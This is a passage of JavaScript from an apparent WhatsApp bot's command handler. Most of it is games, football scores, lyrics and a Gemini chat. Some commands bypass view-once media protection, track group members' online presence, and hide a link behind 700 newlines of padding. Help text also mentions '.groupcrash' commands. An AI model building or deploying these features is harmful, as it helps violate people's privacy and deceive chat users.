                        `_Everyone send acc .readmore Link: wa.me/xxx_\n\n` +
                        `Group members will see "Everyone send acc" and tap *Read more* to reveal the rest.`
                    );
                }

                // WhatsApp shows "Read more" after ~700 characters or many newlines
                const hiddenPadding = '\n'.repeat(700);
                const formattedMsg = `${beforeText || ''}${hiddenPadding}${afterText}`;
                await sock.sendMessage(from, { text: formattedMsg }, { quoted: msg });
                break;
            }

            // --- GROUP ID / GROUP LIST ---
            case ".groupid": {
                if (isGroup) {
                    const gName = groupNames[from] || "Unknown Group";
                    await reply(`🆔 *Group Name:* ${gName}\n*Group ID:*\n\`${from}\``);
                } else {
                    const knownGroups = Object.entries(groupNames);
                    if (!knownGroups.length) return reply(`📋 No groups cached yet.\n\nRun *.groupid* inside any group first, or wait for the bot to receive a message from a group.`);
                    let listTxt = `📋 *All Known Groups (${knownGroups.length})*\n━━━━━━━━━━━━━━━━━━━\n\n`;
                    knownGroups.forEach(([jid, name], i) => {
                        listTxt += `*${i+1}.* ${name}\n\`${jid}\`\n\n`;
                    });
                    listTxt += `_Use the Group ID above with .groupcrash, .ungroupcrash etc._`;
                    await reply(listTxt);
                }
                break;
            }

            // --- AUTO-REACT ---
            case ".autoreact": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                const reactData = loadAutoReact();
                if (!val || val === "off") {
                    delete reactData[from];
                    saveAutoReact(reactData);
                    return reply("❌ Auto-react turned *OFF* for this group.");
                }
                if (val === "on" || val === "random") {
                    reactData[from] = "random";
                    saveAutoReact(reactData);
                    return reply("✅ Auto-react turned *ON* for this group. Bot will react with random emojis.");
                }
                // Specific emoji
                reactData[from] = val;
                saveAutoReact(reactData);
                await reply(`✅ Auto-react set to *${val}* for this group.`);
                break;
            }

            // --- AUTO-REPLY ---
            case ".autoreply": {
                const sub = parts[1]?.toLowerCase();
                const replyData = loadAutoReply();
                if (sub === "list") {
                    const entries = Object.entries(replyData);
                    if (!entries.length) return reply("📭 No auto-reply keywords set yet.");
                    const list = entries.map(([k, v]) => `• *${k}* → ${v}`).join("\n");
                    return reply(`📋 *Auto-Reply Keywords:*\n\n${list}`);
                }
                if (sub === "add") {
                    const rest = parts.slice(2).join(" ");
                    const sepIdx = rest.indexOf("|");
                    if (sepIdx === -1) return reply("Usage: .autoreply add <keyword> | <reply text>");
                    const keyword = rest.slice(0, sepIdx).trim().toLowerCase();
                    const replyText = rest.slice(sepIdx + 1).trim();
                    if (!keyword || !replyText) return reply("Usage: .autoreply add <keyword> | <reply text>");
                    replyData[keyword] = replyText;
                    saveAutoReply(replyData);
                    return reply(`✅ Auto-reply added:\n*"${keyword}"* → ${replyText}`);
                }
                if (sub === "remove") {
                    const keyword = parts.slice(2).join(" ").trim().toLowerCase();
                    if (!replyData[keyword]) return reply(`❌ Keyword "*${keyword}*" not found.`);
                    delete replyData[keyword];
                    saveAutoReply(replyData);
                    return reply(`🗑️ Auto-reply for *"${keyword}"* removed.`);
                }
                await reply(
                    `📖 *Auto-Reply Usage:*\n\n` +
                    `• *.autoreply add* <keyword> | <reply> — Add a keyword reply\n` +
                    `• *.autoreply remove* <keyword> — Remove a keyword\n` +
                    `• *.autoreply list* — Show all keywords\n\n` +
                    `_Example:_ .autoreply add hello | Hello there! 👋`
                );
                break;
            }

            // --- SET ALIAS ---
            case ".setalias": {
                if (parts.length < 3) return reply("Usage: .setalias <trigger> <.command>\nExample: .setalias hi .menu");
                const trigger = parts[1].toLowerCase();
                const target = parts[2].toLowerCase();
                const aliasData = loadAliases();
                aliasData[trigger] = target;
                saveAliases(aliasData);
                await reply(`✅ Alias set: *${trigger}* → *${target}*\nNow typing *${trigger}* will run *${target}*.`);
                break;
            }

            case ".delalias": {
                if (!parts[1]) return reply("Usage: .delalias <trigger>");
                const trigger = parts[1].toLowerCase();
                const aliasData = loadAliases();
                if (!aliasData[trigger]) return reply(`❌ Alias *${trigger}* not found.`);
                delete aliasData[trigger];
                saveAliases(aliasData);
                await reply(`🗑️ Alias *${trigger}* deleted.`);
                break;
            }

            case ".aliases": {
                const aliasData = loadAliases();
                const entries = Object.entries(aliasData);
                if (!entries.length) return reply("📭 No aliases set yet.\n\nUse .setalias <trigger> <.command> to add one.");
                const list = entries.map(([k, v]) => `• *${k}* → ${v}`).join("\n");
                await reply(`📋 *Command Aliases:*\n\n${list}`);
                break;
            }

            // --- OCR (extract text from image) ---
            case ".ocr": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const quotedType = quoted ? getContentType(quoted) : null;
                if (!quoted || quotedType !== "imageMessage") {
                    return reply("📸 Reply to an image with *.ocr* to extract the text from it.");
                }
                await reply("🔍 Extracting text from image...");
                try {
                    const fakeMsg = { ...msg, message: quoted };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    const text = await ocrFromBuffer(buf);
                    if (!text) return reply("❌ No text found in the image.");
                    await reply(`📝 *Extracted Text:*\n\n${text}`);
                } catch (e) {
                    await reply(`❌ OCR failed: ${e?.message || "error"}`);
                }
                break;
            }

            // --- LIST ONLINE / OFFLINE ---
            case ".listonline":
            case ".listoffline": {
                const targetInput = parts[1];
                let targetJid = from;
                if (targetInput) {
                    try { targetJid = await resolveGroupJid(sock, targetInput); } catch (e) {
                        return reply(`❌ ${e.message}`);
                    }
                } else if (!isGroup) {
                    return reply("Usage: .listonline [group link or ID] (or use inside the group)");
                }
                await reply("🔍 Checking presence... this takes ~8 seconds.");
                try {
                    const meta = await sock.groupMetadata(targetJid);
                    const members = meta.participants.map(p => p.id).slice(0, 50);
                    for (const jid of members) {
                        try { await sock.presenceSubscribe(jid); } catch (_) {}
                    }
                    await delay(8000);
                    const online = members.filter(j => ["available", "composing", "recording"].includes(presenceTracker[j]));
                    const offline = members.filter(j => !online.includes(j));
                    if (cmd === ".listonline") {
                        const list = online.length ? online.map(j => `• +${j.split("@")[0]}`).join("\n") : "None detected online";
                        await reply(`🟢 *Online Members — ${meta.subject}*\n\n${list}\n\n_Note: Presence detection is approximate._`);
                    } else {
                        const list = offline.length ? offline.map(j => `• +${j.split("@")[0]}`).join("\n") : "All members appear online";
                        await reply(`🔴 *Offline Members — ${meta.subject}*\n\n${list}\n\n_Note: Presence detection is approximate._`);
                    }
                } catch (e) {
                    await reply(`❌ Failed: ${e?.message || "error"}`);
                }
                break;
            }

            // --- FOOTBALL COMMANDS ---
            case ".pltable": {
                await reply("⏳ Fetching Premier League table...");
                try { await reply(await getPLTable()); } catch (e) { await reply(`❌ Could not fetch table: ${e?.message}`); }
                break;
            }

            case ".live": {
                await reply("⏳ Fetching live scores...");
                try { await reply(await getLiveScores()); } catch (e) { await reply(`❌ Could not fetch scores: ${e?.message}`); }
                break;
            }

            case ".fixtures": {
                const team = parts.slice(1).join(" ").trim();
                if (!team) return reply("Usage: .fixtures <club name>\nExample: .fixtures Liverpool");
                await reply(`⏳ Fetching fixtures for *${team}*...`);
                try {
                    const result = await getClubFixtures(team);
                    if (!result) return reply(`❌ Club *${team}* not found in Premier League.`);
                    await reply(result);
                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
                break;
            }

            case ".fnews": {
                const team = parts.slice(1).join(" ").trim();
                if (!team) return reply("Usage: .fnews <club name>\nExample: .fnews Arsenal");
                await reply(`⏳ Fetching news for *${team}*...`);
                try {
                    const result = await getClubNews(team);
                    if (!result) return reply(`❌ Club *${team}* not found in Premier League.`);
                    await reply(result);
                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
                break;
            }

            case ".football": {
                const team = parts.slice(1).join(" ").trim();
                if (!team) {
                    return reply(
                        `⚽ *Football Commands:*\n\n` +
                        `• *.pltable* — Premier League standings\n` +
                        `• *.live* — Live PL scores\n` +
                        `• *.fixtures* <club> — Upcoming fixtures\n` +
                        `• *.fnews* <club> — Club news\n` +
                        `• *.football* <club> — Full club overview\n\n` +
                        `_Example: .football Liverpool_`
                    );
                }
                await reply(`⏳ Fetching info for *${team}*...`);
                try {
                    const [fixtures, news] = await Promise.allSettled([getClubFixtures(team), getClubNews(team)]);
                    const fx = fixtures.status === "fulfilled" ? fixtures.value : null;
                    const nw = news.status === "fulfilled" ? news.value : null;
                    if (!fx && !nw) return reply(`❌ Club *${team}* not found. Check the spelling.`);
                    if (fx) await reply(fx);
                    if (nw) await reply(nw);
                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
                break;
            }

            // --- VIEW ONCE (reply to a view-once message with .viewonce) ---
            case ".viewonce": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (!quoted) return reply("👁️ Reply to a view-once message with *.viewonce* to reveal it.");
                const voMsg = quoted?.viewOnceMessage?.message || quoted?.viewOnceMessageV2?.message || quoted;
                const voType = getContentType(voMsg);
                try {
                    const fakeMsg = { ...msg, message: voMsg };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    const ownerJid = sock.user?.id;
                    if (voType === "imageMessage") {
                        await sock.sendMessage(ownerJid, { image: buf, caption: `👁️ View-once image revealed` });
                        await reply("✅ Sent to your private chat!");
                    } else if (voType === "videoMessage") {
                        await sock.sendMessage(ownerJid, { video: buf, caption: `👁️ View-once video revealed` });
                        await reply("✅ Sent to your private chat!");
                    } else {
                        await reply("❌ Unsupported view-once type.");
                    }
                } catch (e) { await reply(`❌ Failed to reveal: ${e?.message}`); }
                break;
            }

            // --- SONG SEARCH ---
            case ".song": {
                const query = parts.slice(1).join(" ").trim();
                if (!query) return reply("Usage: .song <title> [artist]\nExample: .song Blinding Lights The Weeknd");
                await reply(`🎵 Searching for *${query}*...`);
                try {
                    const results = await searchSongs(query);
                    if (!results.length) return reply(`❌ No songs found for *${query}*.`);
                    let text = `🎵 *Search results for "${query}":*\n━━━━━━━━━━━━━━━━━━━\n`;
                    for (const s of results) {
                        const mins = Math.floor(s.trackTimeMillis / 60000);
                        const secs = String(Math.floor((s.trackTimeMillis % 60000) / 1000)).padStart(2, "0");
                        text += `\n🎧 *${s.trackName}*\n👤 ${s.artistName}\n💿 ${s.collectionName}\n⏱️ ${mins}:${secs}\n`;
                        if (s.previewUrl) text += `🔊 Preview: ${s.previewUrl}\n`;
                        text += `─────────────────\n`;
                    }
                    text += `\n_Use .lyrics <artist> | <title> to get lyrics_`;
                    await reply(text);
                } catch (e) { await reply(`❌ Song search failed: ${e?.message}`); }
                break;
            }

            // --- LYRICS ---
            case ".lyrics": {
                const lyricsInput = parts.slice(1).join(" ").trim();
                if (!lyricsInput.includes("|")) return reply("Usage: .lyrics <artist> | <song title>\nExample: .lyrics Burna Boy | Last Last");
                const [artist, title] = lyricsInput.split("|").map(s => s.trim());
                if (!artist || !title) return reply("Usage: .lyrics <artist> | <song title>");
                await reply(`🎤 Fetching lyrics for *${title}* by *${artist}*...`);
                try {
                    const lyrics = await getLyrics(artist, title);
                    if (!lyrics) return reply(`❌ Lyrics not found for *${title}* by *${artist}*.`);
                    const header = `🎤 *${title.toUpperCase()}*\n👤 ${artist}\n━━━━━━━━━━━━━━━━━━━\n\n`;
                    const fullText = header + lyrics;
                    // Split if too long (WhatsApp limit ~65000 chars)
                    if (fullText.length > 4000) {
                        await reply(fullText.slice(0, 4000) + "\n\n_(continued...)_");
                        if (fullText.length > 4000) await reply(fullText.slice(4000, 8000));
                    } else {
                        await reply(fullText);
                    }
                } catch (e) { await reply(`❌ Lyrics fetch failed: ${e?.message}`); }
                break;
            }

            // --- IMAGE GENERATION (Pollinations.ai - free, no API key) ---
            case ".imagine": {
                const prompt = parts.slice(1).join(" ").trim();
                if (!prompt) return reply("Usage: .imagine <description>\nExample: .imagine a beautiful sunset over Lagos");
                await reply(`🎨 Generating image for: _${prompt}_\nThis may take 10-20 seconds...`);
                try {
                    const imgUrl = buildImageGenUrl(prompt);
                    const buf = await fetchBuffer(imgUrl);
                    await sock.sendMessage(from, { image: buf, caption: `🎨 *Generated Image*\n_${prompt}_` }, { quoted: msg });
                } catch (e) { await reply(`❌ Image generation failed: ${e?.message}`); }
                break;
            }

            // --- SCREENSHOT ---
            case ".ss":
            case ".screenshot": {
                const url = parts[1];
                if (!url) return reply("Usage: .ss <url>\nExample: .ss google.com");
                await reply(`📸 Taking screenshot of *${url}*...`);
                try {
                    const ssUrl = buildScreenshotUrl(url);
                    const buf = await fetchBuffer(ssUrl);
                    await sock.sendMessage(from, { image: buf, caption: `📸 Screenshot of ${url}` }, { quoted: msg });
                } catch (e) { await reply(`❌ Screenshot failed: ${e?.message}`); }
                break;
            }

            // --- AI CHAT (Google Gemini) ---
            case ".ai":
            case ".ask":
            case ".gemini": {
                const question = parts.slice(1).join(" ").trim();
                if (!question) return reply("Usage: .ai <your question>\nExample: .ai What is the capital of Nigeria?");
                const GEMINI_KEY = process.env.GEMINI_API_KEY;
                if (!GEMINI_KEY) return reply("⚠️ AI chat needs a Gemini API key.\n\nGet a FREE key at: https://aistudio.google.com/app/apikey\n\nThen add it as GEMINI_API_KEY in your Replit secrets.");
                await reply("🤖 Thinking...");
                try {
                    const reqBody = JSON.stringify({ contents: [{ parts: [{ text: question }] }] });
                    const aiReply = await new Promise((resolve, reject) => {
                        const req = https.request({
                            hostname: "generativelanguage.googleapis.com",
                            path: `/v1beta/models/gemini-pro:generateContent?key=${GEMINI_KEY}`,
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                        }, (res) => {
                            let data = "";
                            res.on("data", c => data += c);
                            res.on("end", () => {
                                try {
                                    const parsed = JSON.parse(data);
                                    const text = parsed?.candidates?.[0]?.content?.parts?.[0]?.text || "No response";
                                    resolve(text);
                                } catch { reject(new Error("Parse error")); }
                            });
                        });
                        req.on("error", reject);
                        req.write(reqBody);
                        req.end();
                    });
                    await reply(`🤖 *Gemini AI:*\n\n${aiReply}`);
                } catch (e) { await reply(`❌ AI error: ${e?.message}`); }
                break;
            }

            // --- TIC-TAC-TOE ---
            case ".ttt": {
                if (!isGroup) return reply("Tic-Tac-Toe only works in groups.");
                const sub = parts[1]?.toLowerCase();
                if (sub === "stop" || sub === "end") {
                    delete gameState[from];
                    return reply("🛑 Tic-Tac-Toe game ended.");
                }
                const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (mentioned.length < 2) return reply("Usage: .ttt @player1 @player2\n\nTag 2 players to start a game!");
                if (gameState[from]) return reply("⚠️ A game is already active. Use *.ttt stop* to end it.");
                gameState[from] = {
                    type: "ttt",
                    board: Array(9).fill(""),
                    players: [mentioned[0], mentioned[1]],
                    turn: 0,
                };
                await sock.sendMessage(from, {
                    text: `❌⭕ *Tic-Tac-Toe Started!*\n\n` +
                          `❌ @${mentioned[0].split("@")[0]} vs ⭕ @${mentioned[1].split("@")[0]}\n\n` +
                          `${renderTTTBoard(gameState[from].board)}\n\n` +
                          `👉 @${mentioned[0].split("@")[0]} goes first! Send a number *1-9* to make your move.`,
                    mentions: mentioned,
                });
                break;
            }

            // --- TRUTH OR DARE ---
            case ".truth": {
                const truth = TRUTHS[Math.floor(Math.random() * TRUTHS.length)];
                await reply(`🤔 *TRUTH:*\n\n_${truth}_`);
                break;
            }

            case ".dare": {
                const dare = DARES[Math.floor(Math.random() * DARES.length)];
                await reply(`😈 *DARE:*\n\n_${dare}_`);
                break;
            }

            // --- WORD CHAIN ---
            case ".wordchain": {
                if (!isGroup) return reply("Word Chain only works in groups.");
                const sub = parts[1]?.toLowerCase();
                if (sub === "stop" || sub === "end") {
                    delete gameState[from];
                    return reply("🛑 Word Chain game ended.");
                }
                if (gameState[from]) return reply("⚠️ A game is already active. Use *.wordchain stop* to end it first.");
                const startWord = parts[1] || "PHANTOM";
                const word = startWord.toLowerCase().replace(/[^a-z]/g, "");
                gameState[from] = { type: "wordchain", lastWord: word, usedWords: [word], lastPlayer: null };
                const nextLetter = word.slice(-1).toUpperCase();
                await reply(
                    `🔤 *Word Chain Started!*\n\n` +
                    `First word: *${word.toUpperCase()}*\n\n` +
                    `Next word must start with *${nextLetter}*\n` +
                    `Rules: No repeating words! Use *.wordchain stop* to end.`
                );
                break;
            }

            // --- PING ---
            case ".ping": {
                const start = Date.now();
                await reply(`🏓 Pong! *${Date.now() - start}ms*`);
                break;
            }

            // --- CALCULATOR ---
            case ".calc": {
                const expr = parts.slice(1).join("").replace(/[^0-9+\-*/.%()\s]/g, "");
                if (!expr) return reply("Usage: .calc 5 * 3 + 2");
                try { await reply(`🧮 *${expr} = ${eval(expr)}*`); } catch { await reply("❌ Invalid expression."); }
                break;
            }

            // --- COIN FLIP ---
            case ".flip": {
                await reply(`🪙 *${Math.random() < 0.5 ? "HEADS" : "TAILS"}!*`);
                break;
            }

            // --- DICE ---
            case ".dice": {
                const sides = parseInt(parts[1]) || 6;
                const roll = Math.floor(Math.random() * sides) + 1;
                await reply(`🎲 Rolled a *${sides}-sided die*: *${roll}!*`);
                break;
            }

            // --- MAGIC 8-BALL ---
            case ".8ball": {
                const q = parts.slice(1).join(" ").trim();
                if (!q) return reply("Usage: .8ball Will I win today?");
                const ans = EIGHTBALL[Math.floor(Math.random() * EIGHTBALL.length)];
                await reply(`🎱 *Question:* _${q}_\n\n🎱 *Answer:* ${ans}`);
                break;
            }

            // --- ROCK PAPER SCISSORS ---
            case ".rps": {
                const choices = { rock: "🪨", paper: "📄", scissors: "✂️" };
                const wins = { rock: "scissors", paper: "rock", scissors: "paper" };
                const user = parts[1]?.toLowerCase();
                if (!choices[user]) return reply("Usage: .rps rock/paper/scissors");
                const bot = Object.keys(choices)[Math.floor(Math.random() * 3)];
                let result = user === bot ? "🤝 It's a *draw*!" : wins[user] === bot ? "🎉 You *win*!" : "😈 You *lose*!";
                await reply(`✊ *Rock Paper Scissors!*\n\nYou: ${choices[user]} *${user}*\nMe: ${choices[bot]} *${bot}*\n\n${result}`);
                break;
            }

            // --- SLOTS ---
            case ".slots": {
                const sym = ["🍒","🍋","🍊","🍇","⭐","💎","🔔"];
                const r = [sym[Math.floor(Math.random()*7)], sym[Math.floor(Math.random()*7)], sym[Math.floor(Math.random()*7)]];
                const won = r[0]===r[1] && r[1]===r[2];
                await reply(`🎰 *SLOTS!*\n\n┌─────────────┐\n│  ${r[0]}  │  ${r[1]}  │  ${r[2]}  │\n└─────────────┘\n\n${won ? "🎉 *JACKPOT! You win!* 💰" : r[0]===r[1]||r[1]===r[2]||r[0]===r[2] ? "✨ *Two of a kind!* Almost there..." : "❌ No match. Try again!"}`);
                break;
            }

            // --- TRIVIA ---
            case ".trivia": {
                if (triviaState[from]) {
                    const t = triviaState[from];
                    const guess = parts.slice(1).join(" ").trim().toLowerCase();
                    if (!guess) return reply(`❓ *Question:* _${t.q}_\n\n💡 Hint: ${t.hint}\n\nType *.trivia <answer>* to answer!`);
                    if (guess === t.a) {
                        delete triviaState[from];
                        return reply(`✅ *CORRECT!* 🎉\n\nThe answer was: *${t.a}*`);
                    } else {
                        return reply(`❌ Wrong! Try again or type *.trivia skip* to skip.`);
                    }
                }
                if (parts[1]?.toLowerCase() === "skip") { delete triviaState[from]; return reply("⏭️ Question skipped!"); }
                const tq = TRIVIA_QUESTIONS[Math.floor(Math.random() * TRIVIA_QUESTIONS.length)];
                triviaState[from] = tq;
                await reply(`🧠 *TRIVIA TIME!*\n\n❓ *${tq.q}*\n\n💡 Hint: ${tq.hint}\n\nType *.trivia <your answer>*`);
                break;
            }

            // --- HANGMAN ---
            case ".hangman": {
                const HANG = ["⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n⬜🟧⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n🟦⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n🟦🟪⬜⬜⬜","💀 DEAD"];
                if (!hangmanState[from] || parts[1]?.toLowerCase() === "start" || parts[1]?.toLowerCase() === "new") {
                    const word = HANGMAN_WORDS[Math.floor(Math.random() * HANGMAN_WORDS.length)];
                    hangmanState[from] = { word, guessed: [], wrong: 0 };
                    const display = word.split("").map(l => "_").join(" ");
                    return reply(`🎯 *HANGMAN!*\n\nWord: *${display}*\nWrong guesses: 0/6\n\n${HANG[0]}\n\nType *.hangman <letter>* to guess!`);
                }
                if (parts[1]?.toLowerCase() === "stop") { delete hangmanState[from]; return reply("🛑 Hangman stopped."); }
                const hState = hangmanState[from];
                const letter = parts[1]?.toLowerCase().replace(/[^a-z]/g,"");
                if (!letter || letter.length !== 1) return reply("Type *.hangman <single letter>* to guess, or *.hangman new* to start.");
                if (hState.guessed.includes(letter)) return reply(`⚠️ You already guessed *${letter}*! Try a different letter.`);
                hState.guessed.push(letter);
                if (!hState.word.includes(letter)) hState.wrong++;
                const display = hState.word.split("").map(l => hState.guessed.includes(l) ? l.toUpperCase() : "_").join(" ");
                const isWon = hState.word.split("").every(l => hState.guessed.includes(l));
                const isLost = hState.wrong >= 6;
                if (isWon) { delete hangmanState[from]; return reply(`🎉 *YOU WIN!*\n\nWord: *${hState.word.toUpperCase()}*\n\nCongratulations! Type *.hangman new* to play again.`); }
                if (isLost) { delete hangmanState[from]; return reply(`💀 *GAME OVER!*\n\nThe word was: *${hState.word.toUpperCase()}*\n\n${HANG[6]}\n\nType *.hangman new* to try again.`); }
                await reply(`🎯 *HANGMAN*\n\nWord: *${display}*\nGuessed: ${hState.guessed.join(", ")}\nWrong: ${hState.wrong}/6\n\n${HANG[hState.wrong]}`);
                break;
            }

            // --- NUMBER GUESSING GAME ---
            case ".numguess": {
                if (numGuessState[from]) {
                    const ng = numGuessState[from];
                    const guess = parseInt(parts[1]);
                    if (isNaN(guess)) return reply(`🔢 *Number Guess Active!*\n\nGuess a number between *1 and 100*.\nAttempts used: *${ng.attempts}*\nType *.numguess <number>*`);
                    ng.attempts++;
                    if (guess === ng.number) {
                        delete numGuessState[from];
                        return reply(`🎉 *CORRECT!* The number was *${ng.number}*!\n\nYou got it in *${ng.attempts} attempt${ng.attempts > 1 ? "s" : ""}*! ${ng.attempts <= 5 ? "🏆 Impressive!" : ng.attempts <= 10 ? "👍 Nice!" : "Keep practicing!"}`);
                    }
                    const hint = guess < ng.number ? "📈 Too low! Go higher." : "📉 Too high! Go lower.";
                    return reply(`${hint}\n\nAttempts: *${ng.attempts}*\nType *.numguess <number>* to keep guessing.\nGive up? *.numguess stop*`);
                }
                if (parts[1]?.toLowerCase() === "stop") { delete numGuessState[from]; return reply("🛑 Number guess game ended."); }
                const secret = Math.floor(Math.random() * 100) + 1;
                numGuessState[from] = { number: secret, attempts: 0 };
                await reply(`🔢 *NUMBER GUESS GAME!*\n\nI'm thinking of a number between *1 and 100*.\nCan you guess it?\n\nType *.numguess <number>* to guess!\nType *.numguess stop* to give up.`);
                break;
            }

            // --- RIDDLE ---
            case ".riddle": {
                if (triviaState[`riddle_${from}`]) {
                    const r = triviaState[`riddle_${from}`];
                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
                    if (parts[1]?.toLowerCase() === "skip") {
                        delete triviaState[`riddle_${from}`];
                        return reply(`⏭️ Skipped! The answer was: *${r.a}*`);
                    }
                    if (!ans) return reply(`🧩 *Current Riddle:*\n\n_${r.q}_\n\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip*`);
                    if (ans === r.a) {
                        delete triviaState[`riddle_${from}`];
                        return reply(`✅ *CORRECT!* 🎉\n\nThe answer was: *${r.a}*\n\nWell done! Try *.riddle* for another one.`);
                    }
                    return reply(`❌ Wrong! Try again.\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip* to give up.`);
                }
                const rd = RIDDLES[Math.floor(Math.random() * RIDDLES.length)];
                triviaState[`riddle_${from}`] = rd;
                await reply(`🧩 *RIDDLE TIME!*\n\n_${rd.q}_\n\n💡 Hint: ${rd.hint}\n\nType *.riddle <your answer>* to answer!`);
                break;
            }

            // --- MATH QUIZ ---
            case ".mathquiz": {
                const ops = ["+", "-", "*"];
                const op = ops[Math.floor(Math.random() * 3)];
                const a = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
                const b = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
                const ans = op === "+" ? a + b : op === "-" ? a - b : a * b;
                const opName = op === "+" ? "plus" : op === "-" ? "minus" : "times";
                await reply(`🧮 *MATH QUIZ!*\n\nWhat is *${a} ${op} ${b}*?\n\n_(${a} ${opName} ${b})_\n\nType your answer — first correct reply wins!\n⚡ _Answer: ||${ans}||_`);
                break;
            }

            // --- WOULD YOU RATHER ---
            case ".wouldurather":
            case ".wyr": {
                const wyr = WOULD_U_RATHER[Math.floor(Math.random() * WOULD_U_RATHER.length)];
                const [optA, optB] = wyr.split(" OR ");
                await reply(`🤔 *WOULD YOU RATHER?*\n\n${wyr}\n\n*A)* ${optA.replace("Would you rather ", "").trim()}\n*B)* ${optB?.trim() || "..."}\n\nReply A or B! 👇`);
                break;
            }

            // --- WORD SCRAMBLE ---
            case ".scramble": {
                if (scrambleState[from]) {
                    const sc = scrambleState[from];
                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
                    if (parts[1]?.toLowerCase() === "skip") {
                        delete scrambleState[from];
                        return reply(`⏭️ Skipped! The word was: *${sc.word.toUpperCase()}*`);
                    }
                    if (!ans) return reply(`🔀 *Scrambled:* *${sc.scrambled}*\n\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
                    if (ans === sc.word) {
                        delete scrambleState[from];
                        return reply(`✅ *CORRECT!* 🎉\n\nThe word was: *${sc.word.toUpperCase()}*\n\nWell unscrambled! Try *.scramble* for another.`);
                    }
                    return reply(`❌ Wrong! Try again.\n🔀 Scrambled: *${sc.scrambled}*\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
                }
                const sw = SCRAMBLE_WORDS[Math.floor(Math.random() * SCRAMBLE_WORDS.length)];
                const scrambled = sw.word.split("").sort(() => Math.random() - 0.5).join("").toUpperCase();
                scrambleState[from] = { word: sw.word, scrambled, hint: sw.hint };
                await reply(`🔀 *WORD SCRAMBLE!*\n\nUnscramble this word:\n\n*${scrambled}*\n\n💡 Hint: ${sw.hint}\n\nType *.scramble <your answer>*\nGive up? *.scramble skip*`);
                break;
            }

            // --- HOROSCOPE ---
            case ".horoscope": {
                const sign = parts[1]?.toLowerCase().trim();
                const signs = Object.keys(HOROSCOPES);
                if (!sign || !HOROSCOPES[sign]) {
                    return reply(`♈ *HOROSCOPE*\n\nType *.horoscope <sign>*\n\nAvailable signs:\n${signs.map(s => `• ${s}`).join("\n")}`);
                }
                await reply(`✨ *Daily Horoscope*\n\n${HOROSCOPES[sign]}\n\n_✨ Phantom X Horoscope — ${new Date().toDateString()}_`);
                break;
            }

            // --- SHIP (love calculator) ---
            case ".ship": {
                const shipMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (shipMentioned.length < 2) {
                    const names = parts.slice(1).join(" ").split("&").map(n => n.trim());
                    if (names.length < 2 || !names[1]) return reply("Usage: .ship @person1 @person2\nOr: .ship Name1 & Name2");
                    const pct = Math.floor(Math.random() * 101);
                    const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
                    const msg2 = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
                    return reply(`💘 *SHIP CALCULATOR*\n\n${names[0]} ❤️ ${names[1]}\n\n${bar}\n*${pct}% compatible*\n\n${msg2}`);
                }
                const n1 = `@${shipMentioned[0].split("@")[0]}`;
                const n2 = `@${shipMentioned[1].split("@")[0]}`;
                const pct = Math.floor(Math.random() * 101);
                const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
                const result = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
                await sock.sendMessage(from, { text: `💘 *SHIP CALCULATOR*\n\n${n1} ❤️ ${n2}\n\n${bar}\n*${pct}% compatible*\n\n${result}`, mentions: shipMentioned }, { quoted: msg });
                break;
            }

            // --- RATE (random rate out of 100) ---
            case ".rate": {
                const rateMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const rateName = rateMentioned.length ? `@${rateMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const rate = Math.floor(Math.random() * 101);
                const bar = "🟩".repeat(Math.floor(rate / 10)) + "⬜".repeat(10 - Math.floor(rate / 10));
                const rateMsg = rate >= 90 ? "🏆 Absolutely elite!" : rate >= 70 ? "🔥 Very impressive!" : rate >= 50 ? "👍 Above average!" : rate >= 30 ? "😐 Room to grow." : "💀 Rough day...";
                await sock.sendMessage(from, { text: `📊 *RATE*\n\n${rateName} rated:\n\n${bar}\n*${rate}/100*\n\n${rateMsg}`, mentions: rateMentioned }, { quoted: msg });
                break;
            }

            // --- VIBE CHECK ---
            case ".vibe": {
